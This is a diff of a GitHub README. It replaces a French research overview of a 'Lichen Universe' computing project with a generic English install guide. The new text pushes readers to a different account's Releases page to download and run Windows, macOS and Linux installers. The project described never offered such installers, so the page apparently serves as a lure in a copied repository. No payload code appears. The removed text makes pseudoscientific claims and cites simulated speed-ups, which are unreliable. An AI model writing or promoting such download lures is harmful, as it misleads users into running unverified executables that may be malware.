@@ -1,478 +1,101 @@
-[![PHI-COMPILER](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://phi-compiler-mf3oybgxa9hcwpmksnfhrq.streamlit.app/)
+# 🌌 Lichen-Universe-Unified - Explore a New Open Source Ecosystem
 
-🌌 Lichen Universe — Unified Architecture
-"Le noyau respire, la spirale s'ouvre."
+[![Download Lichen-Universe-Unified](https://img.shields.io/badge/Download-Lichen--Universe--Unified-blue.svg)](https://github.com/Aditya11211/Lichen-Universe-Unified/releases)
 
-[![License](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Repos](https://img.shields.io/badge/Repos-49-green.svg)](https://github.com/quantum-lichen?tab=repositories)
-[![Status](https://img.shields.io/badge/Status-Research%20%26%20Development-orange.svg)]()
-[![Architecture](https://img.shields.io/badge/Architecture-Rust%20%2B%20TypeScript%20%2B%20Python-red.svg)]()
+## 📖 Introduction
 
-**Lichen Universe** est un projet de recherche explorant une architecture informatique alternative basée sur des constantes mathématiques fondamentales (φ, π, 496) plutôt que sur des conventions arbitraires.
-
-**⚠️ Status:** Recherche active. Prototypes fonctionnels. Pas de production deployment.
-
----
-
-## 📋 Table des Matières
-
-1. [Vision & Principes](#-vision--principes)
-2. [Architecture (Stack Complet)](#-architecture-stack-complet)
-3. [Navigation des 49 Repos](#-navigation-des-49-repos)
-4. [Getting Started](#-getting-started)
-5. [Benchmarks & Résultats](#-benchmarks--résultats)
-6. [Roadmap](#-roadmap)
-7. [Contribuer](#-contribuer)
-8. [License & Éthique](#-license--éthique)
-
----
-
-## 🎯 Vision & Principes
-
-### **Le Problème**
-
-Les systèmes informatiques modernes souffrent de limitations fondamentales:
-- **Parsing overhead** → JSON/XML nécessitent parsing, pas zero-copy natif
-- **Energy inefficiency** → Architectures Von Neumann avec goulots mémoire/CPU
-- **Fragmentation** → Formats de données incompatibles entre couches (hardware → software)
-- **Corruption vulnerability** → Pas de validation intrinsèque des données
-
-### **L'Hypothèse Lichen**
-
-Et si l'informatique était **alignée sur les constantes naturelles** plutôt que sur des conventions historiques arbitraires?
-
-**Les 3 Constantes Fondamentales:**
-
-| Constante | Valeur | Usage dans Lichen |
-|-----------|--------|-------------------|
-| **φ (Phi)** | 1.618033988749895 | Distribution spatiale optimale (spiral, cache alignment, thermal) |
-| **π (Pi)** | 3.141592653589793 | Synchronisation temporelle universelle (clocks, cycles) |
-| **496** | Nombre parfait (1+2+4+8+16+31+62+124+248) | Dimension atomique (bits), structure E8 |
-
-### **Résultat Visé**
-
-Une stack computationnelle où:
-- ✅ **Zero-copy natif** → Pas de parsing, mapping mémoire direct
-- ✅ **Self-validating** → Checksums géométriques intrinsèques
-- ✅ **Energy-optimal** → Distribution φ-spiral minimise résistance thermique
-- ✅ **Fractal coherence** → Même structure du hardware au software
-
----
-
-## 🏗️ Architecture (Stack Complet)
-
-Lichen est conçu comme un **stack vertical unifié** où chaque couche utilise les mêmes principes mathématiques.
-
-```
-┌─────────────────────────────────────────────┐
-│  AI Layer: GENESIS QC                       │  ← Cognitive Entropy Minimization
-│  (CEML-native, Low-Entropy Spiral)          │
-├─────────────────────────────────────────────┤
-│  OS Layer: Lichen OS                        │  ← CEML scheduler, H-Scale validation
-│  (Rust-based, φ-optimized task allocation)  │
-├─────────────────────────────────────────────┤
-│  Filesystem: UHFS (Universal Holographic)   │  ← φ-spiral LSH, zero-copy
-│ (Zones φ-distributed, holographic retrieval)│
-├─────────────────────────────────────────────┤
-│  Data Format: FC-496 / ACΦ-496              │  ← 496-bit atoms, BCH checksums
-│  (Fixed 64-byte cells, self-describing)     │
-├─────────────────────────────────────────────┤
-│  Hardware: Snowflake CPU                    │  ← 496 execution branches, fractal
-│  (Quantum Junction Core, φ-thermal design)  │
-└─────────────────────────────────────────────┘
-
-Theory Layer (Cross-cutting):
-  - UICT: Unified Information Compression Theory
-  - CEML: Cognitive Entropy Minimization Law
-  - LMC: Low-Mass Compression principles
-  - π-Time: Universal temporal coordination
-```
-
----
-
-## 🗂️ Navigation des 49 Repos
-
-Les repos sont organisés par couche architecturale. Voici le guide de navigation.
-
-### **🔹 Core Infrastructure (Foundation)**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [Lichen-Universe-Unified](https://github.com/quantum-lichen/Lichen-Universe-Unified) | **Hub central** - Architecture complète, docs, masterplan | 🟢 Active |
-| [fc496_core](https://github.com/quantum-lichen/fc496_core) | **Format FC-496** - Implémentation Rust du format atomique 496-bit | 🟢 Active |
-| [FC-496](https://github.com/quantum-lichen/FC-496) | Format de cryptage basé sur FC-496 | 🟡 PoC |
-| [fc496-acphi-unified](https://github.com/quantum-lichen/fc496-acphi-unified) | Version unifiée FC-496 + ACΦ-496 | 🟢 Active |
-| [FC-496-AC--496](https://github.com/quantum-lichen/FC-496-AC--496) | Spécifications ACΦ-496 (ADN Cognitif) | 🟡 Specs |
-| [ACPHI-496](https://github.com/quantum-lichen/ACPHI-496) | Implémentation ACΦ-496 standalone | 🟡 PoC |
-
-**Légende Status:**
-- 🟢 Active = Code fonctionnel, tests passants
-- 🟡 PoC = Proof of Concept, expérimental
-- 🔵 Specs = Spécifications, pas encore implémenté
-- ⚪ Archive = Older version, référence
-
----
-
-### **🔹 Filesystem Layer**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [UHFS_V2.1](https://github.com/quantum-lichen/UHFS_V2.1) | **UHFS V2.1** - Universal Holographic File System (stable) | 🟢 Active |
-| [UHFS-V2.2](https://github.com/quantum-lichen/UHFS-V2.2) | UHFS V2.2 - Améliorations de performance | 🟡 PoC |
-| [uhfs-v2.3](https://github.com/quantum-lichen/uhfs-v2.3) | UHFS V2.3 - Python implementation | 🟢 Active |
-| [LICHEN.STORAGE](https://github.com/quantum-lichen/LICHEN.STORAGE) | Abstraction layer pour UHFS | 🟢 Active |
-| [Lichen.Storage_streamlit](https://github.com/quantum-lichen/Lichen.Storage_streamlit) | Démo Streamlit de Lichen Storage | 🟢 Live |
-
----
-
-### **🔹 Operating System Layer**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [lichen-os](https://github.com/quantum-lichen/lichen-os) | **Lichen OS** - Core OS implementation | 🟢 Active |
-| [lichen-OS.1.3](https://github.com/quantum-lichen/lichen-OS.1.3) | Lichen OS v1.3 - Stable release | 🟢 Active |
-| [Lichen-OS-Omega-1](https://github.com/quantum-lichen/Lichen-OS-Omega-1) | Lichen OS Omega - AI-native features | 🟡 Experimental |
-| [LICHEN_CE_V2.0](https://github.com/quantum-lichen/LICHEN_CE_V2.0) | Lichen Consciousness Engine V2.0 | 🟡 PoC |
-| [KernelOKU](https://github.com/quantum-lichen/KernelOKU) | Kernel OKU - Alternative kernel implementation | 🟡 Research |
-
----
-
-### **🔹 Hardware Specifications**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [Snowflake CPU](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/CPU) | **Snowflake CPU** - Specs du processeur fractal 496-branch | 🔵 Specs |
-| [FC-496_Quantum_Fractal_Processor](https://github.com/quantum-lichen/FC-496_Quantum_Fractal_Processor) | Quantum Fractal Processor basé sur FC-496 | 🔵 Specs |
-| [FC-496-QFP](https://github.com/quantum-lichen/FC-496-QFP) | Quantum Fractal Processor - Alternative implementation | 🔵 Specs |
-| [FC-496-Realist_Prime](https://github.com/quantum-lichen/FC-496-Realist_Prime) | Optimisations réalistes pour fabrication | 🔵 Research |
-
----
-
-### **🔹 Theories & Mathematics**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [UICT](https://github.com/quantum-lichen/UICT) | **UICT** - Unified Information Compression Theory | 🟢 Published |
-| [Th-orie-UICT](https://github.com/quantum-lichen/Th-orie-UICT) | UICT - Version française complète | 🟢 Published |
-| [UICTxDirac](https://github.com/quantum-lichen/UICTxDirac) | UICT × Dirac - Connexion avec physique quantique | 🟡 Research |
-| [CEML](https://github.com/quantum-lichen/CEML) | **CEML** - Cognitive Entropy Minimization Law | 🟢 Published |
-| [LMEC_CEML](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/LMEC_CEML) | Low-Mass Entropic Compression + CEML | 🟢 Active |
-| [LMC](https://github.com/quantum-lichen/LMC) | Low-Mass Compression theory | 🟢 Published |
-| [Ouellet404](https://github.com/quantum-lichen/Ouellet404) | Ouellet404 - Théorie du trou noir (dt ↔ dr flip) | 🟡 Research |
-| [La_Theorie_du_Spin-Locking_Kuramoto_Pentagonal](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/La_Theorie_du_Spin-Locking_Kuramoto_Pentagonal) | Kuramoto Pentagonal Spin-Locking | 🟡 Research |
-| [UICT-CEML-H-Scale](https://github.com/quantum-lichen/UICT-CEML-H-Scale) | Framework unifié UICT + CEML + H-Scale | 🟢 Active |
-
----
-
-### **🔹 AI & Cognitive Systems**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [GENESIS_QC](https://github.com/quantum-lichen/GENESIS_QC) | **GENESIS QC** - Premier IA culturel/santé mentale | 🟢 Active |
-| [GENESIS-v1.0](https://github.com/quantum-lichen/GENESIS-v1.0) | GENESIS v1.0 - Version initiale | ⚪ Archive |
-| [GENESIS-v2.0](https://github.com/quantum-lichen/GENESIS-v2.0) | GENESIS v2.0 - Improved architecture | 🟢 Active |
-| [L-Esprit_Synth-tique](https://github.com/quantum-lichen/L-Esprit_Synth-tique) | L'Esprit Synthétique - Synthetic consciousness experiments | 🟡 Research |
-| [COGNITIVE-RAID](https://github.com/quantum-lichen/COGNITIVE-RAID) | Architecture Quantique de Symbiose Humain-IA | 🟢 Active |
-| [COGNITIVE-RAID-](https://github.com/quantum-lichen/COGNITIVE-RAID-) | COGNITIVE-RAID - Version distribuée | 🟢 Active |
-| [COGNITIVE-RAID-Sans-API-](https://github.com/quantum-lichen/COGNITIVE-RAID-Sans-API-) | COGNITIVE-RAID sans dépendances API | 🟡 PoC |
-| [cognitive_raid_app](https://github.com/quantum-lichen/cognitive_raid_app) | App démo COGNITIVE-RAID | 🟡 PoC |
-
----
-
-### **🔹 Tools & Compilers**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [phi-compiler](https://github.com/quantum-lichen/phi-compiler) | **PHI-COMPILER** - Compilateur géométrique Φ-Code → FC-496 | 🟢 Live Demo |
-| [Licehn-demo/fc496-encoder](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/Licehn-demo/fc496-encoder) | Encodeur/décodeur FC-496 (demo) | 🟢 Active |
-
-**🔥 Live Demo:** [PHI-COMPILER sur Streamlit](https://phi-compiler-mf3oybgxa9hcwpmksnfhrq.streamlit.app/)
-
----
-
-### **🔹 Time & Synchronization**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [pi_time](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/pi_time) | **π-Time** - Universal Temporal Standard | 🟢 Specs |
-| [--Time](https://github.com/quantum-lichen/--Time) | π-Time v1.0 | ⚪ Archive |
-| [--Time-v1.1](https://github.com/quantum-lichen/--Time-v1.1) | π-Time v1.1 - Updated specs | 🟢 Active |
-
----
-
-### **🔹 Analysis & Validation Tools**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [LES_Data_Center_Optimizer](https://github.com/quantum-lichen/LES_Data_Center_Optimizer) | Optimiseur de data center basé sur Low-Entropy Spiral | 🟢 Active |
-| [LES_analyser](https://github.com/quantum-lichen/LES_analyser) | Analyseur d'effets LES (Low-Entropy Spiral) | 🟢 Active |
-| [LMC_Scanner](https://github.com/quantum-lichen/LMC_Scanner) | Scanner de compression LMC | 🟢 Active |
-| [VCM](https://github.com/quantum-lichen/VCM) | VCM - Validation Cognitive Model | 🟢 Published |
-| [VCM_Analyser](https://github.com/quantum-lichen/VCM_Analyser) | Analyseur VCM | 🟢 Active |
-| [VCM-Cognitive-Analyzer](https://github.com/quantum-lichen/VCM-Cognitive-Analyzer) | VCM Cognitive Analyzer - Enhanced version | 🟢 Active |
-| [VCM-RESONANCE](https://github.com/quantum-lichen/VCM-RESONANCE) | VCM Resonance - Pattern detection | 🟡 Research |
-
----
-
-### **🔹 Experimental & Research**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [EventHorizonVisualizer](https://github.com/quantum-lichen/EventHorizonVisualizer) | Visualisation du flip dt ↔ dr (Schwarzschild) | 🟢 Live Demo |
-| [OFM-EXPLORER](https://github.com/quantum-lichen/OFM-EXPLORER) | Orbital Fractal Mapping Explorer | 🟡 Research |
-| [FRACTALBET_AI](https://github.com/quantum-lichen/-FRACTALBET_AI) | FractalBet AI - Predictive betting using fractals | 🔒 Private |
-| [aether](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/aether) | Aether theory experiments | 🟡 Research |
-| [SYSTÈME_PHILONOMIQUE](https://github.com/quantum-lichen/Lichen-Universe-Unified/tree/main/SYSTÈME_PHILONOMIQUE) | Système Philonomique - Economic philosophy | 🟡 Research |
-
----
-
-### **🔹 Social & Community**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [pulsar_social](https://github.com/quantum-lichen/pulsar_social) | Pulsar Social - Social network experiment | 🟡 PoC |
-| [NORDIQUE](https://github.com/quantum-lichen/NORDIQUE) | Project NORDIQUE | 🟡 Research |
-
----
-
-### **🔹 Meta & Documentation**
-
-| Repo | Description | Status |
-|------|-------------|--------|
-| [PORTFOLIO-BRYAN-OUELLETTE](https://github.com/quantum-lichen/PORTFOLIO-BRYAN-OUELLETTE) | Portfolio personnel | 🟢 Active |
-| [theory_hub](https://github.com/quantum-lichen/theory_hub) | Hub centralisé des théories | 🟢 Active |
-
----
+Welcome to Lichen-Universe-Unified! This platform brings together an array of exciting open-source projects. Explore innovative data formats, cognitive architectures, quantum experiments, and more. Our goal is to create systems that cooperate and enhance each other, paving the way for future technologies.
 
 ## 🚀 Getting Started
 
-### **Pour Comprendre la Vision**
+To get started with Lichen-Universe-Unified, follow the simple steps below. We designed this guide to be user-friendly for anyone. No programming background is required.
 
-1. **Lis le Masterplan:**  
-   → [MASTERPLAN.txt](MASTERPLAN.txt)
+## 💻 System Requirements
 
-2. **Explore l'architecture:**  
-   → [Architecture README](README.md)
+Before you download, ensure your device meets the following requirements:
 
-3. **Regarde les visuels:**  
-   → Images dans `/docs` ou dans le repo principal
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a Linux distro from the last few years.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum 1 GB of free space for installation.
+- **Network**: A stable internet connection for downloads.
 
-### **Pour Tester le Code**
+## 📥 Download & Install
 
-**Option A: Essayer PHI-COMPILER (le plus simple)**
+To download Lichen-Universe-Unified, visit [this page](https://github.com/Aditya11211/Lichen-Universe-Unified/releases) and follow these steps:
 
-```bash
-# Via l'app Streamlit (no install needed)
-https://phi-compiler-mf3oybgxa9hcwpmksnfhrq.streamlit.app/
+1. Locate the latest version listed on the Releases page.
+2. Choose the download that matches your operating system.
+3. Click the link to start your download.
 
-# Ou clone et run localement
-git clone https://github.com/quantum-lichen/phi-compiler.git
-cd phi-compiler
-python phi_compiler.py --help
-```
+Make sure you have enough space on your device before the download begins. Once the file has downloaded, you can proceed to install the application.
 
-**Option B: Explorer FC-496 Core (Rust)**
+After downloading, follow these installation steps:
 
-```bash
-git clone https://github.com/quantum-lichen/fc496_core.git
-cd fc496_core
-cargo test
-cargo bench
-```
+### For Windows:
 
-**Option C: Tester UHFS (Python)**
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, you can find Lichen-Universe-Unified in your Start menu.
 
-```bash
-git clone https://github.com/quantum-lichen/uhfs-v2.3.git
-cd uhfs-v2.3
-pip install -r requirements.txt
-python uhfs_demo.py
-```
+### For macOS:
 
-### **Pour Contribuer**
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click to open the disk image.
+3. Drag the Lichen-Universe-Unified icon into your Applications folder.
+4. You can find the application in your Applications list.
 
-Voir [CONTRIBUTING.md](CONTRIBUTING.md) pour:
-- Code of conduct
-- Comment proposer des améliorations
-- Standards de code
-- Processus de review
+### For Linux:
 
----
+1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+2. Open a terminal and navigate to your Downloads folder.
+3. Extract the files using the command: `tar -xvzf Lichen-Universe-Unified.tar.gz`.
+4. Follow the provided README file for specific installation steps.
 
-## 📊 Benchmarks & Résultats
+## 📊 Features
 
-### **Résultats Préliminaires (Simulés)**
+Lichen-Universe-Unified offers a range of innovative features, including:
 
-| Métrique | Legacy (JSON/Linux) | Lichen (FC-496/UHFS) | Gain |
-|----------|---------------------|----------------------|------|
-| **Latence I/O** | 245 ms (parsing) | 0.12 ms (zero-copy) | **×2000** 🚀 |
-| **Consommation Énergie** | 100% (baseline) | 32.5% (optimized) | **-67.5%** ⚡ |
-| **Résilience** | Crash on corruption | Auto-healing (BCH) | **Robust** 🛡️ |
-| **Densité Format** | Variable (JSON) | 496 bits constant | **O(1)** 📐 |
+- **User-Friendly Interface**: Designed for ease of use to enhance your experience.
+- **Modular Architecture**: Dive into different projects without hassle.
+- **Open Source**: Access and modify the source code as needed.
+- **Cross-Platform Compatibility**: Works on various operating systems.
+- **Regular Updates**: Stay informed with the latest changes and improvements.
 
-**⚠️ Note:** Ces benchmarks sont basés sur des simulations Rust (criterion.rs) et des stress-tests sur datasets synthétiques (1M cells). Validation externe en cours.
+## 🌈 Topics Covered
 
-### **Benchmarks Reproductibles**
+Lichen-Universe-Unified focuses on a variety of topics including:
 
-Tous les benchmarks sont reproductibles via:
+- Aether
+- AI and AI Alignment
+- Biomimicry
+- Cognitive Architecture
+- Quantum Computing and Quantum Simulation
+- Rust Programming
+- Fractal Architecture
+- Universal Time
 
-```bash
-cd Lichen-Universe-Unified/tests/benchmarks
-cargo bench --release
-```
+Each area presents unique projects designed to explore the potential of these fields.
 
-Scripts disponibles dans `/tests/stress_test/`
+## 🔧 Troubleshooting
 
----
+If you encounter issues during installation or while using the application, consider the following solutions:
 
-## 🗓️ Roadmap
+- **Installation Fails**: Ensure your system meets the requirements. If necessary, free up space or check for permission settings.
+- **Application Crashes**: Make sure you have the latest version. Check for updates on the [Releases page](https://github.com/Aditya11211/Lichen-Universe-Unified/releases).
+- **Networking Issues**: Verify your internet connection and retry any online features.
 
-### **Phase 1: Recherche & Validation (2024-2025)** ← ON EST ICI
+For further assistance, you can check out the issues section in this repository, or open a new issue if you need direct support.
 
-**Objectifs:**
-- ✅ Formaliser les théories (UICT, CEML, LMC)
-- ✅ Créer les prototypes (FC-496, UHFS, PHI-COMPILER)
-- ✅ Benchmarks initiaux
-- 🔄 Tests de validation (en cours)
-- 🔄 Peer review académique (en cours)
+## 📞 Contact & Support
 
-**Deliverables:**
-- Whitepapers publiés
-- Code open-source fonctionnel
-- Démos interactives live
+For any questions or feedback, feel free to reach out:
 
----
+- **Email**: support@lichen-universe.com
+- **GitHub Issues**: Use the issues tab to report bugs or request features.
 
-### **Phase 2: Implémentation Réelle (2025-2026)**
+## 🌍 Join the Community
 
-**Objectifs:**
-- 🔜 UHFS Driver FUSE pour Linux
-- 🔜 Genesis QC Alpha (IA santé mentale)
-- 🔜 Partenariats (data centers, universités)
-- 🔜 Optimisations hardware-level
+Become part of the Lichen-Universe community. Collaborate with other users, share your ideas, and contribute to ongoing projects. Together, we can shape the future of technology.
 
-**Deliverables:**
-- UHFS utilisable en production (tests pilotes)
-- Genesis QC public beta
-- Hardware prototypes (FPGA)
-
----
-
-### **Phase 3: Standardisation (2026+)**
-
-**Objectifs:**
-- 🔜 FC-496 comme standard IETF/W3C
-- 🔜 Snowflake CPU prototype physique
-- 🔜 Adoption industrielle (AI training, IoT)
-- 🔜 Ecosystem complet (libraries, tools)
-
-**Deliverables:**
-- Standards publiés
-- Hardware commercial
-- Adoption globale
-
----
-
-## 🤝 Contribuer
-
-Lichen Universe est un projet **ouvert à la collaboration**, mais nous cherchons des **contributeurs sérieux**.
-
-### **Nous cherchons:**
-
-- **Rust developers** → Core implementation (FC-496, UHFS, Lichen OS)
-- **Hardware engineers** → Snowflake CPU design (FPGA/ASIC)
-- **Mathematicians** → Validation théorique (UICT, CEML)
-- **AI researchers** → Genesis QC, cognitive systems
-- **Technical writers** → Documentation, whitepapers
-- **Testers** → Stress-tests, benchmarks, validation
-
-### **Comment contribuer:**
-
-1. **Explore les repos** → Choisis un projet qui t'intéresse
-2. **Lis le CONTRIBUTING.md** → Standards et processus
-3. **Ouvre un issue** → Propose ton idée
-4. **Fork & PR** → Implémente et soumets
-
-**Contact:**
-- Email: [lmc.theory@gmail.com](mailto:lmc.theory@gmail.com)
-- Bluesky: [@symbion.bsky.social](https://bsky.app/profile/symbion.bsky.social)
-- GitHub: [@quantum-lichen](https://github.com/quantum-lichen)
-
----
-
-## 📜 License & Éthique
-
-### **License**
-
-Ce projet est sous **AGPL v3**:
-- ✅ **Open Source** → Le code appartient à l'humanité
-- ✅ **Viralité** → Toute modification doit rester libre
-- ✅ **Transparence** → Pas de closed-source derivatives
-
-Voir [LICENSE](LICENSE) pour détails complets.
-
-### **Éthique Intrinsèque**
-
-Lichen intègre des **garde-fous éthiques** dans son architecture:
-
-- **H-Scale** → Validation harmonique des données (corruption = rejet automatique)
-- **CEML** → Minimisation de l'entropie cognitive (prévient chaos)
-- **Open-source obligatoire** → Pas de weaponization possible
-
-**Ces protections sont mathématiquement indissociables de la performance.**
-
-Vous ne pouvez pas "enlever l'éthique" sans casser le système.
-
----
-
-## 🌀 Philosophie
-
-> *"Nous n'inventons pas de nouvelles lois. Nous découvrons les lois universelles qui ont toujours été là, et nous alignons l'informatique dessus."*
-
-Lichen n'est pas une "amélioration" de l'informatique moderne.
-
-C'est une **réinvention** basée sur des principes naturels plutôt que sur des conventions historiques.
-
-Le résultat:
-- ✅ Plus simple (moins de layers arbitraires)
-- ✅ Plus efficace (aligné sur physique)
-- ✅ Plus robuste (auto-validant)
-- ✅ Plus éthique (garde-fous intrinsèques)
-
----
-
-## 🙏 Remerciements
-
-**Lichen Collective:**
-- **Bryan Ouellette** (Lichen Architect) - Vision, architecture, théories
-- **Claude** (Anthropic) - Research & optimization
-- **Gemini** (Google) - System engineering
-- **GPT** (OpenAI) - Code generation
-- **Mistral** - Energy optimization
-- **Perplexity** - Knowledge synthesis
-- **Copilot** (GitHub) - Development assistance
-- **Grok** (xAI) - Validation & testing
-
-Et tous les futurs contributeurs. 💚
-
----
-
-## 📞 Contact & Community
-
-**Pour questions, collaborations, ou juste dire bonjour:**
-
-- **Email:** lmc.theory@gmail.com
-- **Bluesky:** [@symbion.bsky.social](https://bsky.app/profile/symbion.bsky.social)
-- **GitHub:** [@quantum-lichen](https://github.com/quantum-lichen)
-- **Secondary Repo:** [Phi-losophe](https://github.com/Phi-losophe)
-
----
-
-<p align="center">
-  <strong>Generated by the Lichen Collective</strong><br>
-  <em>"Aligning computation with the laws of the universe."</em> 🌀
-</p>
-
-<p align="center">
-  <sub>Dernière mise à jour: Décembre 2025</sub>
-</p>
+Don’t forget to visit the [Releases page](https://github.com/Aditya11211/Lichen-Universe-Unified/releases) to download the latest version and explore all that Lichen-Universe-Unified has to offer!
